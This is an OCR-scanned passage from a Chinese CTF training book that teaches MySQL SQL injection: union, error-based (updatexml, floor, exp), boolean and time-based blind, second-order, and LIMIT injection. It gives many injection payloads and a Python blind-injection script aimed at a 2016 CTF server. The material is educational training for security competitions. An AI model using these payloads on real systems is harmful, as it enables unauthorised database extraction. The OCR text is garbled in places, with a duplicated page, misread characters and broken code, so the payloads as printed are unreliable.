拼接后SQL语句就变成了：
SELECT IdFROM users WHERE user id=-1union select 1 --
闭合前面的单引号，注释掉后面的单引号，中间写上需要的
Payload就可以了。或许你会注意到，传递参数的时候用到了“+”号，
---
## Page 40
CTF特训营：技术详解、解题方法与
2.2可以联合查询的SQL注入
40/1144
而查询语句中并没有出现这个加号，这是因为服务器在处理用户输入
的时候已经自动将加号转义为空格符了。
联合查询是最简单易学，也是最容易理解和上手的注入方法，所
以在题自中出现可以使用联合查询进行回显的注入时，一股需要绕过
某些特定字符或者是特定单词（比如，空格或者select、and、or等字
符串）。
---
## Page 41
CTF特训营：技术详解、解题方法与
2.3报错注入
41/1144
2.3报错注入
这里主要介绍3种MySQL数据库报错注入的方法，分别是
updatexml、floor和exp。
1.updatexml
updatexml的报错原理从本质上来说就是函数的报错，如图2-1所
示。
mysql>SELECT updatexml（1,concat（ox7e,（SELECT version（)),θx7e),1）;
mysql>
图2-1updatexml报错回显示例
这里还是使用前面的例子，举出一个爆破数据库版本的样例
Payload:
?id=1'+updatexml(1,concat（0x7e，(SELECTversion(),0x7e),1)%23
其他功能的Payload可以参照下面floor的使用方法来修改。
2.floor
---
## Page 42
CTF特训营：技术详解、解题方法与
2.3报错注入
42/1144
简单来说，floor报错的原理是rand和orderby或groupby的冲突。
在MySQL文档中的原文如下：
RAND() in aWHERE clause isre-evaluated every time theWHERE is executed.
Use of a column withRAND()values in an ORDERBY or GROUPBYclause may
yield unexpectedresultsbecauseforeitherclauseaRAND()expressioncanbe
evaluated multiple times for the same row, each time returning a different result.(http:
//dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)
理解了原理之后，接下来我们来说一下应用的方法，如下。
爆破数据库版本信息：
?id=1'+and(select 1from(select count(*),concat(select(select(select concat（Ox7e
version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2)x from
information_schema.tablesgroupbyx)a)%23
爆破当前用户：
user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from
information_schema.tablesgroupbyx)a)%23
爆破当前使用的数据库：
?id=1'+and(select 1from(select count(*),concat（(select(select（select concat（Ox7e
database(),0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from
information_schema.tablesgroupbyx)a)%23
---
## Page 43
CTF特训营：技术详解、解题方法与
2.3报错注入
42/1144
简单来说，floor报错的原理是rand和orderby或groupby的冲突。
在MySQL文档中的原文如下：
RAND() in aWHEREclause is re-evaluated every time the WHEREis executed
Use of a column with RAND() values in an ORDER BY or GROUPBYclause may
yield unexpectedresultsbecause for either clause a RAND() expression can be
evaluated multiple timesfor the same row,each timereturning a different result.(http:
//dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)
理解了原理之后，接下来我们来说一下应用的方法，如下。
爆破数据库版本信息：
?id=1'+and(select 1from(select count(*),concat(select(select(select concat（Ox7e
version(),0x7e))from information_schema.tables limit 0,1),floor(rand(0)*2))x from
information_schema.tablesgroupbyx)a)%23
爆破当前用户：
?id=1'+and(select1from(selectcount(*),concat（（select（select（select concat（Ox7e
user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from
information_schema.tablesgroupbyx)a)%23
爆破当前使用的数据库：
?id=1'+and（select 1from(select count(*),concat（（select（select（select concat（Ox7e，
database(),0x7e)))from information_schema.tables limit 0,1),floor（rand(0)*2))xfrom
information_schema.tablesgroupbyx)a)%23
---
## Page 44
CTF特训营：技术详解、解题方法与
2.3报错注入
44/1144
接下来是exp函数报错，exp（）报错的本质原因是溢出报错。我们
可以在MySQL中进行如图2-3所示的操作。
DouBLE value ts out of range inexp（-（（select 'rootelocalhost'fron dual)))
nysql>
图2-3exp报错回显示例
同样使用前面的例子，Payload为：
?id=1'andexp（~（select*from（selectuser())x))%23
---
## Page 45
CTF特训营：技术详解、解题方法与
2.4Bool盲注
45/1144
2.4Bool盲注
Boo盲注通常是由于开发者将报错信息屏蔽而导致的，但是网页
中真和假有着不同的回显，比如为真时返回access，为假时返回false
或者为真时返回正常页面，为假时跳转到错误页面等
Bool盲注中通常会配套使用一些判断真假的语句来进行判定。常
用的发现Bool盲注的方法是在输入点后面添加and1=1和and1=2（该
Payload应在怀疑是整型注入的情况下使用）。
Bool盲注的原理是如果题目后端拼接了SQL语句，and1=1为真
时不会影响执行结果，但是and=2为假，页面则可能会没有正常的
回显。
有时候我们可能会遇到将1=1过滤掉的SQL注入点，这时候我们
可以通过修改关键字来绕过过滤，比如将关键字修改为不常见的数值
（如1352=1352等）。
在字符串型注入的时候我们还需要绕过单引号，将Payload修改
为如下格式and1='1和or1=2来闭合单引l号
---
## Page 46
CTF特训营：技术详解、解题方法与
2.4Bool盲注
46/1144
在Bool盲注中，我们经常使用的函数有以下几种分类，具体如表
2-1~表2-3所示。
（1）截取函数
表2-1截取函数及其说明
函数名
功能及使用方法
substr函数是字符申截取函数，在盲注中我们一般逐位获取数据，这时候就需要使用substr函数按位截
substr()
取。使用方法：substr（str,start，length）。这里的str为被截取的字符串，start 为开始截取的位置，length为截
取的长度。在育注时，我们一般只截取一位，如substr（user0.1,1），这样可以从user函数返回数据的第一位
开始的编移位置截取一位，之后我们只要修改位置参数即可获取其他的数据
left 两数是左截取两数，left 的用法为lef（strlength）。这里的str是被截取的字符串，length为被截取的
长度。在育注中可以使用lef（user（）.1）来左截取一位字符。但是，如果是lef（userO.2），则会将user的前
两位都截取出来，这样的话，我们需要在匹配输出的字符串之前增加前级，把之前几次的结果添加到这次
的结果之前
使用样例如下：
lef()
假设userO函数返网的字符串是“admin”，那么
selecta from b where left（a,l)='a
会返回真，在探测第二位的时候，需要把第一位添加到当前探测位之前，比如：
select a from b where left（a,2)-'ad
以此类推，直到读取到全部内容为止
right(
right函数是右截取函数。使用方法与lef函数类似，可以参考left函数的用法
(2）转换函数
表2-2转换函数及其说明
函数名
功能及使用方法
ascii函数的作用是将字符申转换为ASCII码，这样我们就可以避免在Payload中出现单引号。使用方法
ascii(
为asci（char），这里的char为一个字符，在育注中一般为单个字母。如果char为一申字符中，则返同结果
将是第一个字母的ASCII码。我们在使用中通常与substr函数相结合，如asci（substr（userO,1,1)）、这样可
以获得userO的第一位字符的ASCII码
hex()
Hex函数可以将字符申的值转换为十六进制的值。在asci函数被禁止时，或者是需要将二进制数据写人
文件时可以使用该函数，使用方法类似于asci函数
---
## Page 47
CTF特训营：技术详解、解题方法与
2.4Boo首注
47/1144
(3）比较函数
表2-3比较函数及其说明
函数名
功能及使用方法
f函数是育注中经常使用的函数，f函数的作用与1-1和1-2的原理类似。如果我们要育注的对象为假。
则可以通过if的返回结果对页面进行控制。使用方法为if（cond,Ture_result，False_result)
其中，cond为判断条件，Ture_result为真时的返回结果，False_result 为假时的返回结果。
ifo
使用样例如下：
?id=1 and 1=if(ascii(substr(user(),1,1))=97,1,2)
如果uscr的第一位是*a’则将返回1.否则就返回2。然面，如果返回的是2，则会使and后的条件不
成立，导致返回错误页面。这时我们可以根据页面的长度进行判定，从面达到方注的效架
注意：在盲注的题目及真实的渗透测试中，有时候使用Sqlmap
可能会存在误报。原因在于在一些数据返回页面及接口返回数据时可
能会存在返回的是随机字符串（如，时间戳或防止CSRF的Token等）
导致页面的长度发生变化的情况，这时候我们的工具及自动化检测脚
本会出现误报。我们需要冷静地对Payload和返回结果进行分析。
---
## Page 48
CTF特训营：技术详解、解题方法与
2.5时间盲注
48/1144
2.5时间盲注
时间盲注出现的本质原因也是由于服务器端拼接了SQL语句，但
是止确和错误存在同样的回显。错误信息被过滤，不过，可以通过页
面响应时间进行按位判断数据。由于时间盲注中的函数是在数据库中
执行的，因此在CTF比赛中关于时间盲注的题目比较少，原因在于
sleep函数或者benchmark函数的过多执行会让服务器负载过高，再加
上CTF里面的一些“搅屎棍”的参与，会让题目挂掉。不过，有时候
我们还是会在CTF中遇到这些题目，这里简单说一下注入的方法。
时间盲注类似于Bool盲注，只不过是在验证阶段有所不同。Boo
盲注是根据页面回显的不同来判断的，而时间盲注是根据页面响应时
间来判断结果的。一股来说，延迟的时间可以根据客户端与服务器端
之间响应的时间来进行选择，选择一个合适的时间即可。一般来说
时间盲注常用的函数有sleep（）和benchmark（）两个，具体说明如表2-4
所示。
表2-4可用来延时的函数
---
## Page 49
CTF特训营：技术详解、解题方法与
2.5时间首注
49/1144
函数名
功能及使用方法
sleep是睡眠函数，可以使查询数据时回显数据的响应时间加长。使用方法如 sleep(N），这里的N
为睡眠的时间。
使用时可以配合i进行使用。如：
sleep
if(ascii(substr(user(),1,1))=114,sleep(5),2)
这样的话，如果uscr的第一位是‘r，则页面返回将延迟5秒。这里需要注意的是，这5秒是在服
务器端的数据库中延迟的，实际情况可能会由于网络环境等因素延迟更长时间
benchmark函数原本是用来重复执行某个语句的函数，我们可以用这个函数来测试数据库的读写性
能等。使用方法如下：
benchmark(N, expression)
benchmark()
其中，N为执行的次数，expression为表达式。如果需要进行育注，我们通常需要进行消耗时间和
性能的计算，比如哈希计算函数MD5O，将MD5函数重复执行数万次则可以达到延迟的效果，面具
体的情况需要根据不同比赛的服务器性能及网络情况来决定
---
## Page 50
CTF特训营：技术详解、解题方法与.
2.6二次注入
50/1144
2.6二次注入
二次注入的起因是数据在第一次入库的时候进行了一些过滤及转
义，当这条数据从数据库中取出来在SQL语句中进行拼接，而在这次
拼接中没有进行过滤时，我们就能执行构造好的SQL语句了。
由于二次注入的业务逻辑较为复杂，在比赛中一般很难发现，所
以出题人一般会将源码放出来，或者提示本题有二次注入。
在二次注入的题目中，一般不会是单纯的二次注入，通常还会与
报错注入或Bool盲注结合出题。比如，在注册页面输入的用户名在登
录后才有盲注的回显，这时候我们需要自已编写脚本模拟注册及登
录。
下面列举一个二次注入中包含盲注的例子（2016年西电信安协
会的I-ctf），简单描述下当时的题目。存在用户的登录与注册页面
登录后可以修改用户的买像，判断注入的点也就是这个买像是否有显
示。如果注册时用户名构造的Payload为真，则可以在页面收到回显
的头像的地址，反之则没有。因为在测试时发现头像的链接很长，所
以我们用页面返回长度来确定盲注结果，下面是当时写的漏洞利用代
---
## Page 51
CTF特训营：技术详解、解题方法与
2.6二次注入
51/1144
码，我们在代码的注释中解释了每条语句的原理：
#l/usr/bin/envpython
#coding:UTF-8（"If“)
author_=T1m0n
import requests
def getdata(pos,payload_chr):
parampos:盲注点
parampayload_chr:字符串
return：如果pos位置是payload_chr，则返回payload_chr，反之则返回空
#当时网络环境比较差，经常出现502的情况，当返回502或者其他信息时
使用try再次执行本函数
try:
用户名注意看后面的payload，这里的payload的意义为返回第一个数据库，
并按位截取
user=zaaa\/**/and/**/asci(substr((SELECT/*(SCHEMA_NAME)/*/FROM*/
information_schema.SCHEMATA/**/limit/**/0,1),%d,1))=%d/**/and/**A1\=\1%(pos,
ord(payload_chr))
#密码，只在登录时起作用
ee,=pmssed
#注册机登录的url
url_login=http://web.l-ctf.com:55533/check.php
#注册时post的数据
resign_data=
user':user,
'pass': passwd,
vrtify:'1,
typer:0,
register:%E6%B3%A8%E5%86%8C,
#负责发送注册请求
r0=requests.post（url_login,resign_data）
r0.close()
#登录刚才注册的账号
login_data={
user':user,
'pass':passwd,
vrtify:'1',
typer:0',
1ogin:%E7%99%BB%E9%99%86,
---
## Page 52
CTF特训营：技术详解、解题方法与
2.6二次注入
52/1144
r1=requests.post（url_login,login_data)
#截取返回头中的cookie，方便我们进入下一步的登录用户中心
cookie=r1.headers[Set-Cookie.split(;)[0]
r1.close()
#用户中心登录
url_center="http://web.1-ctf.com:55533/ucenter.php
headers={cookie:cookie}
#登录用户中心
r2 = requests.get（url_center,headers=headers)
res=r2.content
#如果返回的长度大于700，则证明这个位置的字符串是正确的，
并返回这个字符串：如果小于700，则返回空
if len(res)>700:
print payload_chr,ord(payload_chr)
returnpayload_chr
else:
print',
return
except:
getdata(pos,payload_chr)
if
name
main
payloads =abcdefghjkmnopqrstuvwxyz1234567890@_
res=*
for pos in range(1, 20):
for payload in payloads:
res += getdata(pos,payload)
print res
#附上当时的注入结果
#user--lctf
#database--web_200
#table--user
#column--d,admin,pass
当然，这只是获取flag过程中的一部分，但也是关键的一部分。
在遇到类似思路比较复杂的二次注入题自的时候，我们更要冷静
地分析，不断地尝试，这样才能挖到题目的考点，从而达到获取flag
---
## Page 53
CTF特训营：技术详解、解题方法与
2.6二次注入
53/1144
的目的。
---
## Page 54
CTF特训营：技术详解、解题方法与
2.7limit之后的注入
54/1144
2.7limit之后的注入
研究发现，在MySQL版本号大于5.0.0且小于5.6.6的时候，在如
下位置中可以进行注入：
SELECT field FROM table WHERE id >O ORDER BY id LIMIT {injection_point)
也可以使用如下的Payload进行注入：
SELECTfieldFROM userWHEREid>0ORDER BY id LIMIT 1,1procedure analyse(
extractvalue(rand(),concat(0x3a,version())),1);